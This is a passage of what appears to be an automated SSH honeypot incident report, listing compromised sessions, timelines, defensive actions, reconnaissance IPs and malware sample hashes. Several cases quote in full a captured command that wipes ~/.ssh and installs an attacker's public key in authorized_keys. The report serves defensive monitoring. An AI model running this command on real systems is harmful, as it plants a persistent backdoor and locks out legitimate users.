| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:15:55` | `cowrie.session.connect` |
| `2026-10-20 00:15:55` | `cowrie.client.version` |
| `2026-10-20 00:15:55` | `cowrie.client.kex` |
| `2026-10-20 00:15:56` | `cowrie.login.success` |
| `2026-10-20 00:15:57` | `cowrie.session.params` |
| `2026-10-20 00:15:57` | `cowrie.command.input` |
| `2026-10-20 00:15:57` | `cowrie.command.failed` |
| `2026-10-20 00:15:58` | `cowrie.log.closed` |
| `2026-10-20 00:15:59` | `cowrie.session.params` |
| `2026-10-20 00:15:59` | `cowrie.command.input` |
| `2026-10-20 00:15:59` | `cowrie.session.file_download` |
| `2026-10-20 00:15:59` | `cowrie.log.closed` |
| `2026-10-20 00:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.52.105[.]37` to AbuseIPDB if not already reported
- [ ] Block `164.52.105[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c905365b8426

| Field | Detail |
|---|---|
| **Source IP** | `164.52.105[.]37` |
| **First Seen** | 2026-10-20 00:15 |
| **Last Seen** | 2026-10-20 00:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:15:59` | `cowrie.session.connect` |
| `2026-10-20 00:15:59` | `cowrie.client.version` |
| `2026-10-20 00:15:59` | `cowrie.client.kex` |
| `2026-10-20 00:16:00` | `cowrie.login.success` |
| `2026-10-20 00:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.52.105[.]37` to AbuseIPDB if not already reported
- [ ] Block `164.52.105[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6890f09f08d2

| Field | Detail |
|---|---|
| **Source IP** | `51.38.226[.]55` |
| **First Seen** | 2026-10-20 00:18 |
| **Last Seen** | 2026-10-20 00:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:18:13` | `cowrie.session.connect` |
| `2026-10-20 00:18:13` | `cowrie.client.version` |
| `2026-10-20 00:18:13` | `cowrie.client.kex` |
| `2026-10-20 00:18:14` | `cowrie.login.success` |
| `2026-10-20 00:18:14` | `cowrie.session.params` |
| `2026-10-20 00:18:14` | `cowrie.command.input` |
| `2026-10-20 00:18:14` | `cowrie.command.failed` |
| `2026-10-20 00:18:15` | `cowrie.log.closed` |
| `2026-10-20 00:18:15` | `cowrie.session.params` |
| `2026-10-20 00:18:15` | `cowrie.command.input` |
| `2026-10-20 00:18:15` | `cowrie.session.file_download` |
| `2026-10-20 00:18:15` | `cowrie.log.closed` |
| `2026-10-20 00:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.38.226[.]55` to AbuseIPDB if not already reported
- [ ] Block `51.38.226[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b978c62c24d

| Field | Detail |
|---|---|
| **Source IP** | `51.38.226[.]55` |
| **First Seen** | 2026-10-20 00:18 |
| **Last Seen** | 2026-10-20 00:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:18:15` | `cowrie.session.connect` |
| `2026-10-20 00:18:15` | `cowrie.client.version` |
| `2026-10-20 00:18:15` | `cowrie.client.kex` |
| `2026-10-20 00:18:16` | `cowrie.login.success` |
| `2026-10-20 00:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.38.226[.]55` to AbuseIPDB if not already reported
- [ ] Block `51.38.226[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ed6ee64e76

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-10-20 00:18 |
| **Last Seen** | 2026-10-20 00:19 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:18:56` | `cowrie.session.connect` |
| `2026-10-20 00:18:57` | `cowrie.login.success` |
| `2026-10-20 00:18:58` | `cowrie.session.params` |
| `2026-10-20 00:18:58` | `cowrie.command.input` |
| `2026-10-20 00:18:58` | `cowrie.command.failed` |
| `2026-10-20 00:18:58` | `cowrie.command.input` |
| `2026-10-20 00:18:58` | `cowrie.command.failed` |
| `2026-10-20 00:18:59` | `cowrie.command.input` |
| `2026-10-20 00:18:59` | `cowrie.command.failed` |
| `2026-10-20 00:18:59` | `cowrie.command.input` |
| `2026-10-20 00:18:59` | `cowrie.command.failed` |
| `2026-10-20 00:19:00` | `cowrie.command.input` |
| `2026-10-20 00:19:00` | `cowrie.command.input` |
| `2026-10-20 00:19:00` | `cowrie.command.failed` |
| `2026-10-20 00:19:00` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8c8b8ac1db

| Field | Detail |
|---|---|
| **Source IP** | `51.254.103[.]32` |
| **First Seen** | 2026-10-20 00:19 |
| **Last Seen** | 2026-10-20 00:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:19:21` | `cowrie.session.connect` |
| `2026-10-20 00:19:21` | `cowrie.client.version` |
| `2026-10-20 00:19:21` | `cowrie.client.kex` |
| `2026-10-20 00:19:21` | `cowrie.login.success` |
| `2026-10-20 00:19:22` | `cowrie.session.params` |
| `2026-10-20 00:19:22` | `cowrie.command.input` |
| `2026-10-20 00:19:22` | `cowrie.command.failed` |
| `2026-10-20 00:19:22` | `cowrie.log.closed` |
| `2026-10-20 00:19:23` | `cowrie.session.params` |
| `2026-10-20 00:19:23` | `cowrie.command.input` |
| `2026-10-20 00:19:23` | `cowrie.session.file_download` |
| `2026-10-20 00:19:23` | `cowrie.log.closed` |
| `2026-10-20 00:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.103[.]32` to AbuseIPDB if not already reported
- [ ] Block `51.254.103[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6be146c75b42

| Field | Detail |
|---|---|
| **Source IP** | `51.254.103[.]32` |
| **First Seen** | 2026-10-20 00:19 |
| **Last Seen** | 2026-10-20 00:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:19:23` | `cowrie.session.connect` |
| `2026-10-20 00:19:23` | `cowrie.client.version` |
| `2026-10-20 00:19:23` | `cowrie.client.kex` |
| `2026-10-20 00:19:24` | `cowrie.login.success` |
| `2026-10-20 00:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.103[.]32` to AbuseIPDB if not already reported
- [ ] Block `51.254.103[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1b132cbe071

| Field | Detail |
|---|---|
| **Source IP** | `157.173.125[.]24` |
| **First Seen** | 2026-10-20 00:20 |
| **Last Seen** | 2026-10-20 00:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:20:16` | `cowrie.session.connect` |
| `2026-10-20 00:20:16` | `cowrie.client.version` |
| `2026-10-20 00:20:16` | `cowrie.client.kex` |
| `2026-10-20 00:20:17` | `cowrie.login.success` |
| `2026-10-20 00:20:18` | `cowrie.session.params` |
| `2026-10-20 00:20:18` | `cowrie.command.input` |
| `2026-10-20 00:20:18` | `cowrie.command.failed` |
| `2026-10-20 00:20:18` | `cowrie.log.closed` |
| `2026-10-20 00:20:19` | `cowrie.session.params` |
| `2026-10-20 00:20:19` | `cowrie.command.input` |
| `2026-10-20 00:20:19` | `cowrie.session.file_download` |
| `2026-10-20 00:20:19` | `cowrie.log.closed` |
| `2026-10-20 00:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.173.125[.]24` to AbuseIPDB if not already reported
- [ ] Block `157.173.125[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92a8f7a0458

| Field | Detail |
|---|---|
| **Source IP** | `157.173.125[.]24` |
| **First Seen** | 2026-10-20 00:20 |
| **Last Seen** | 2026-10-20 00:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:20:19` | `cowrie.session.connect` |
| `2026-10-20 00:20:19` | `cowrie.client.version` |
| `2026-10-20 00:20:19` | `cowrie.client.kex` |
| `2026-10-20 00:20:19` | `cowrie.login.success` |
| `2026-10-20 00:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.173.125[.]24` to AbuseIPDB if not already reported
- [ ] Block `157.173.125[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de716946b57

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-10-20 00:21 |
| **Last Seen** | 2026-10-20 00:21 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:21:13` | `cowrie.session.connect` |
| `2026-10-20 00:21:14` | `cowrie.login.success` |
| `2026-10-20 00:21:15` | `cowrie.login.success` |
| `2026-10-20 00:21:16` | `cowrie.session.params` |
| `2026-10-20 00:21:16` | `cowrie.command.input` |
| `2026-10-20 00:21:16` | `cowrie.command.failed` |
| `2026-10-20 00:21:17` | `cowrie.command.input` |
| `2026-10-20 00:21:17` | `cowrie.command.failed` |
| `2026-10-20 00:21:17` | `cowrie.command.input` |
| `2026-10-20 00:21:17` | `cowrie.command.input` |
| `2026-10-20 00:21:17` | `cowrie.command.failed` |
| `2026-10-20 00:21:17` | `cowrie.command.failed` |
| `2026-10-20 00:21:48` | `cowrie.log.closed` |
| `2026-10-20 00:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b76c85e3ea

| Field | Detail |
|---|---|
| **Source IP** | `120.48.57[.]133` |
| **First Seen** | 2026-10-20 00:24 |
| **Last Seen** | 2026-10-20 00:28 |
| **Session Duration** | 250s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:24:29` | `cowrie.session.connect` |
| `2026-10-20 00:24:29` | `cowrie.client.version` |
| `2026-10-20 00:24:29` | `cowrie.client.kex` |
| `2026-10-20 00:24:30` | `cowrie.login.success` |
| `2026-10-20 00:24:31` | `cowrie.session.params` |
| `2026-10-20 00:24:31` | `cowrie.command.input` |
| `2026-10-20 00:24:31` | `cowrie.command.failed` |
| `2026-10-20 00:24:32` | `cowrie.log.closed` |
| `2026-10-20 00:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.57[.]133` to AbuseIPDB if not already reported
- [ ] Block `120.48.57[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (6) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e20d1a62df90 | HIGH | `179.62.216[.]38` | 2026-10-20 00:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-816f2a50e7f4 | HIGH | `179.62.216[.]38` | 2026-10-20 00:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-157ae3b8e118 | HIGH | `172.191.132[.]202` | 2026-10-20 00:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-997bab745345 | HIGH | `172.191.132[.]202` | 2026-10-20 00:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d00c9d662ff2 | HIGH | `85.9.106[.]124` | 2026-10-20 00:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-432cb3b84bde | HIGH | `85.9.106[.]124` | 2026-10-20 00:54 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `123.129.219[.]195` | 1 | 2026-10-20 00:13 | 2026-10-20 00:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-20 00:03 | 2026-10-20 00:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `168.144.63[.]226` | 1 | 2026-10-20 00:01 | 2026-10-20 00:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.98.13[.]44` | 1 | 2026-10-20 00:03 | 2026-10-20 00:03 | 19s | 0 | `T1592` | 🟢 LOW |
| `177.65.188[.]143` | 1 | 2026-10-20 00:12 | 2026-10-20 00:12 | 25s | 0 | `T1592` | 🟢 LOW |
| `195.206.182[.]219` | 1 | 2026-10-20 00:46 | 2026-10-20 00:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.149.43[.]154` | 1 | 2026-10-20 00:08 | 2026-10-20 00:09 | 20s | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | 1 | 2026-10-20 00:10 | 2026-10-20 00:11 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-10-20 00:54 | 2026-10-20 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]49` | 1 | 2026-10-20 00:45 | 2026-10-20 00:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.91.128[.]171` | 1 | 2026-10-20 00:08 | 2026-10-20 00:08 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
